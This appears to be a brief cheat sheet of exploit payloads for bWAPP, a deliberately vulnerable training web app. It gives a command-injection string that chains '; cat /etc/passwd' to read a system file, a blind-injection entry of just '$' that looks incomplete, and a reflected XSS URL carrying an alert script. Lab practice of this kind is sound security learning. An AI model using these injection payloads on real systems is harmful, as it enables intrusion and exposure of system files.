# bWAPP - Exploits

### (1) OS Command Injection (low)
```bash
; cat /etc/passwd
```

### (2) OS Command Injection-Blind (low)
```bash
$
```

### (3) Cross-Site Scripting - Reflected (GET) (low)
```JS
http://example.com/bWAPP/xss_get.php?firstname=Hacker&lastname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&form=submit
```
